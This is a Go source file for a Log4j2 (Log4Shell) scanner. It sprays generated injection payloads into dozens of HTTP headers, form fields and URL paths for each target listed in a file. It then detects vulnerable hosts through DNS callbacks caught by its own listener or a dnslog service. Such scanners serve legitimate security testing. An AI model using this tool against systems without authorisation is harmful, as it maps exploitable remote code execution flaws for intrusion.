package main

import (
	"Log4j2Fuzz/HttpRequest"
	"Log4j2Fuzz/conf"
	"bufio"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"
)

type Empty interface{}

var empty Empty
var Result []string
var PocNum int
var CheckFlag = false
var port = flag.String("port", "53", "DNS server port")
var filename = flag.String("file", "", "scan urls file name")
var ip = flag.String("ip", "", "DNS reverse server ip")

var Headers = map[string]string{
	"User-Agent":   "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
	"Content-Type": "application/x-www-form-urlencoded",
}

var PathList = [...]string{
	"",
	"/hello",
	"?id=",
	"?username=",
	"?page=",
	"/login",
}

var BodyList = [...]string{
	"payload=",
	"user=",
	"pass=",
	"username=",
	"password=",
	"login=",
	"email=",
	"principal=",
	"token=",
	"verify=",
}

var HeaderList = [...]string{
	"Accept-Charset",
	"Accept-Datetime",
	"Accept-Encoding",
	"Accept-Language",
	"Ali-CDN-Real-IP",
	"Authorization",
	"Cache-Control",
	"Cdn-Real-Ip",
	"Cdn-Src-Ip",
	"CF-Connecting-IP",
	"Client-IP",
	"Contact",
	"Cookie",
	"DNT",
	"Fastly-Client-Ip",
	"Forwarded-For-Ip",
	"Forwarded-For",
	"Forwarded",
	"Forwarded-Proto",
	"From",
	"If-Modified-Since",
	"Max-Forwards",
	"Originating-Ip",
	"Origin",
	"Pragma",
	"Proxy-Client-IP",
	"Proxy",
	"Referer",
	"TE",
	"True-Client-Ip",
	"True-Client-IP",
	"Upgrade",
	"User-Agent",
	"Via",
	"Warning",
	"WL-Proxy-Client-IP",
	"X-Api-Version",
	"X-Att-Deviceid",
	"X-ATT-DeviceId",
	"X-Client-IP",
	"X-Client-Ip",
	"X-Client-IP",
	"X-Cluster-Client-IP",
	"X-Correlation-ID",
	"X-Csrf-Token",
	"X-CSRFToken",
	"X-Do-Not-Track",
	"X-Foo-Bar",
	"X-Foo",
	"X-Forwarded-By",
	"X-Forwarded-For-Original",
	"X-Forwarded-For",
	"X-Forwarded-Host",
	"X-Forwarded",
	"X-Forwarded-Port",
	"X-Forwarded-Protocol",
	"X-Forwarded-Proto",
	"X-Forwarded-Scheme",
	"X-Forwarded-Server",
	"X-Forwarded-Ssl",
	"X-Forwarder-For",
	"X-Forward-For",
	"X-Forward-Proto",
	"X-Frame-Options",
	"X-From",
	"X-Geoip-Country",
	"X-Host",
	"X-Http-Destinationurl",
	"X-Http-Host-Override",
	"X-Http-Method-Override",
	"X-HTTP-Method-Override",
	"X-Http-Method",
	"X-Http-Path-Override",
	"X-Https",
	"X-Htx-Agent",
	"X-Hub-Signature",
	"X-If-Unmodified-Since",
	"X-Imbo-Test-Config",
	"X-Insight",
	"X-Ip",
	"X-Ip-Trail",
	"X-Leakix",
	"X-Original-URL",
	"X-Originating-IP",
	"X-ProxyUser-Ip",
	"X-Real-Ip",
	"X-Remote-Addr",
	"X-Remote-IP",
	"X-Requested-With",
	"X-Request-ID",
	"X-True-IP",
	"X-UIDH",
	"X-Wap-Profile",
	"X-WAP-Profile",
	"X-XSRF-TOKEN",
}

func getUrls(filename string) (urls []string) {
	if filename == ""  || (*ip == "" && !conf.Conf.UseDnsLog) {
		os.Exit(1)
	}

	fi, err := os.Open(filename)
	if err != nil {
		fmt.Printf("[Error]: %s\n", err)
		os.Exit(1)
	}
	defer fi.Close()

	br := bufio.NewReader(fi)
	for {
		a, _, c := br.ReadLine()
		if c == io.EOF {
			break
		}
		if strings.HasPrefix(string(a), "http") {
			urls = append(urls, string(a))
		} else {
			urls = append(urls, "http://"+string(a))
		}
	}

	return urls
}

func fuzzLog4j(fuzzUrl string, num int, sem chan Empty) {
	var payload string
	req := HttpRequest.NewRequest()
	req.SetTimeout(5)

	/*proxy, err := url.Parse("http://127.0.0.1:8080")
	if err != nil {
		log.Println(err)
	}
	req.Proxy(http.ProxyURL(proxy))*/

	if conf.DefaultPoc {
		for num2, header := range HeaderList {
			req.InitHeaders()

			if conf.Conf.UseDnsLog {
				payload = conf.DNSGeneratePaylod(strconv.Itoa(num), strconv.Itoa(num2), 0)
			} else {
				payload = conf.GeneratePayload(*ip, *port, strconv.Itoa(num), strconv.Itoa(num2), 0)
			}
			fmt.Printf("[*] Fuzz headers: [%s][%s] payload: %s\n", fuzzUrl, header, payload)

			if header == "User-Agent" {
				req.SetHeaders(map[string]string{
					"User-Agent": payload,
				})
			} else {
				req.SetHeaders(map[string]string{
					"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
					header:       payload,
				})
			}
			_, err := req.Get(fuzzUrl)
			if err != nil {
				fmt.Printf("[Error]: %s\n", err)
			}
		}

		req.InitHeaders()
		req.SetHeaders(Headers)
		offset := len(HeaderList)

		for num3, path := range PathList {
			//path不包含 = 就fuzzpath
			if !strings.Contains(path, "=") {
				for num4, body := range BodyList {
					if conf.Conf.UseDnsLog {
						payload = conf.DNSGeneratePaylod(strconv.Itoa(num), strconv.Itoa(num3+num4+offset), 0)
					} else {
						payload = conf.GeneratePayload(*ip, *port, strconv.Itoa(num), strconv.Itoa(num3+num4+offset), 0)
					}
					fmt.Printf("[*] Fuzz bodys: [%s%s][%s] payload: %s\n", fuzzUrl, path, body, payload)

					_, err := req.Post(fuzzUrl+path, body+payload)
					if err != nil {
						fmt.Printf("[Error]: %s\n", err)
					}
				}
				offset += len(BodyList) - 1
			} else {
				if conf.Conf.UseDnsLog {
					payload = conf.DNSGeneratePaylod(strconv.Itoa(num), strconv.Itoa(num3+offset), 0)
				} else {
					payload = conf.GeneratePayload(*ip, *port, strconv.Itoa(num), strconv.Itoa(num3+offset), 0)
				}
				fmt.Printf("[*] Fuzz paths: [%s][%s] payload: %s\n", fuzzUrl, path, payload)
				_, err := req.Get(fuzzUrl + path + payload)
				if err != nil {
					fmt.Printf("[Error]: %s\n", err)
				}
			}
		}

		confDeal(num, PocNum, req, fuzzUrl)
	} else {
		confDeal(num, 0, req, fuzzUrl)
	}

	sem <- empty
}

func dnsStart(port string, sem1 chan Empty) {
	fmt.Println("[Server] Waiting for the DNS service to start...")

	addr, err := net.ResolveUDPAddr("udp", "0.0.0.0"+":"+port)
	if err != nil {
		fmt.Println("[!] Can't resolve address: ", err)
		os.Exit(1)
	}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		fmt.Println("[!] Error listening:", err)
		os.Exit(1)
	}
	fmt.Println("[Server] DNS service is Listening on " + port + "...")
	sem1 <- empty
	defer conn.Close()
	for {
		handleClient(conn)
	}
}

func handleClient(conn *net.UDPConn) {
	data := make([]byte, 64)
	n, _, err := conn.ReadFromUDP(data)
	if err != nil {
		fmt.Println("[!] failed to read UDP msg because of ", err.Error())
		return
	}

	for _, r := range Result {
		if r == string(data[13:n-5]) {
			return
		}
	}

	Result = append(Result, string(data[13:n-5]))
	fmt.Println("[reverse data]:" + string(data))
}

func checkResult(urls []string) {
	fmt.Println("正在检查DNS服务回连情况...")
	time.Sleep(10e9)

	if len(Result) > 0 {
		fmt.Println("[*] 扫描完成! 发现漏洞!")
		for _, res1 := range Result {
			res := strings.Split(res1, "/")
			k, err := strconv.Atoi(res[1])
			k1, err1 := strconv.Atoi(res[0])

			if err != nil || err1 != nil || k1 >= len(urls) {
				fmt.Printf("[!] 系统异常: [%s]\n", res)
				continue
			}

			if conf.DefaultPoc {
				if k > len(HeaderList)-1 {
					// conf中poc触发漏洞
					if k > PocNum-1 {
						fmt.Printf("[*] url: %s, name: %s, path: %s 存在log4j2漏洞!\n", urls[k1], conf.Conf.Request[k-PocNum].Name, conf.Conf.Request[k-PocNum].Path)
					} else {
						offset := len(HeaderList)
						for num3, path := range PathList {
							if !strings.Contains(path, "=") {
								for num4, body := range BodyList {
									if num3+num4+offset == k {
										fmt.Printf("[*] url: %s, path: %s, body: %s 存在log4j2漏洞!\n", urls[k1], path, body)
									}
								}
								offset += len(BodyList) - 1
							} else {
								if num3+offset == k {
									fmt.Printf("[*] url: %s, path: %s 存在log4j2漏洞!\n", urls[k1], path)
								}
								offset += 1
							}
						}
					}
				} else {
					fmt.Printf("[*] url: %s, header: %s 存在log4j2漏洞!\n", urls[k1], HeaderList[k])
				}
			} else {
				fmt.Printf("[*] url: %s, name: %s, path: %s 存在log4j2漏洞!\n", urls[k1], conf.Conf.Request[k].Name, conf.Conf.Request[k].Path)
			}

		}
	} else {
		if conf.Conf.UseDnsLog && !CheckFlag {
			dnsResult := conf.DNS()
			if len(dnsResult) > 0 {
				for _, v := range dnsResult {
					switch vv := v.(type) {
					case []interface{}:
						for _, res := range vv {
							temp := res.(map[string]interface{})["name"]
							if str, ok := temp.(string); ok {
								//分割后,0 随机数 1 url 2 具体的payload处
								dnslog := strings.Split(str, ".")
								n1, _ := strconv.Atoi(dnslog[1])
								if dnslog[0] == conf.Rand && n1 < len(urls) {
									addFlag := true
									for _, r := range Result {
										if r == dnslog[1] + "/" + dnslog[2] {
											addFlag = false
											break
										}
									}
									if addFlag {
										Result = append(Result, dnslog[1] + "/" + dnslog[2])
									}
								}
							}
						}
					case map[string]interface{}:
						for k1, v1 := range vv {
							if k1 == "code" && v1 != float64(200) {
								fmt.Printf("dnslog平台返回状态码异常:%v\n", v1)
								return
							}
						}
					}
				}
				CheckFlag = true
				checkResult(urls)
				return
			}
		}
		fmt.Println("[*] 扫描完成! 未发现漏洞")
	}
}

func confDeal(num, offset int, req *HttpRequest.Request, fuzzUrl string) {
	var payload string

	if len(conf.Conf.Request) == 0 {
		return
	}

	for k, s := range conf.Conf.Request {
		if conf.Conf.UseDnsLog {
			payload = conf.DNSGeneratePaylod(strconv.Itoa(num), strconv.Itoa(k+offset), k)
		} else {
			payload = conf.GeneratePayload(*ip, *port, strconv.Itoa(num), strconv.Itoa(k+offset), k)
		}

		//payload = conf.GeneratePayload(*ip, *port, strconv.Itoa(num), strconv.Itoa(k+offset), k)

		if s.Path != "" {
			conf.Conf.Request[k].Path = strings.ReplaceAll(s.Path, "*payload*", payload)
		}

		if s.Body1 != "" {
			conf.Conf.Request[k].Body1 = strings.ReplaceAll(s.Body1, "*payload*", payload)
		}

		req.InitHeaders()
		if len(s.Header1) > 0 {
			tempHeader := make(map[string]string)

			for kk, ss := range s.Header1 {
				if ss != "" {
					tempHeader[kk] = strings.ReplaceAll(ss, "*payload*", payload)
				}
			}

			if _, ok := tempHeader["User-Agent"]; !ok {
				tempHeader["User-Agent"] = Headers["User-Agent"]
			}
			req.SetHeaders(tempHeader)
		} else {
			req.SetHeaders(Headers)
		}

		fmt.Printf("[*] Fuzz %s: [%s][%s] payload: %s\n", s.Name, fuzzUrl, conf.Conf.Request[k].Path, payload)

		if s.Method == "GET" {
			_, err := req.Get(fuzzUrl + conf.Conf.Request[k].Path)
			if err != nil {
				fmt.Printf("[Error][GET]: %s[%s]\n", err, conf.Conf.Request[k].Path)
			}
		}
		if s.Method == "POST" {
			_, err := req.Post(fuzzUrl+conf.Conf.Request[k].Path, conf.Conf.Request[k].Body1)
			if err != nil {
				fmt.Printf("[Error][POST]: %s[%s]\n", err, conf.Conf.Request[k].Path)
			}
		}

	}
}

func init() {
	temp := 0
	for _, v := range PathList {
		if strings.Contains(v, "=") {
			temp++
		}
	}

	PocNum = len(HeaderList) + len(BodyList)*temp + len(PathList) - temp
}

func main() {
	flag.Parse()

	urls := getUrls(*filename)
	N := len(urls)

	if N > 1 && runtime.NumCPU() > 1 {
		runtime.GOMAXPROCS(runtime.NumCPU() - 1)
	}

	if !conf.Conf.UseDnsLog {
		sem1 := make(chan Empty, 1)
		go dnsStart(*port, sem1)
		for i := 0; i < 1; i++ {
			<-sem1
		}
	}

	sem := make(chan Empty, N)
	for num, fuzzUrl := range urls {
		go fuzzLog4j(fuzzUrl, num, sem)
	}

	//等待协程结束
	for i := 0; i < N; i++ {
		<-sem
	}

	checkResult(urls)
}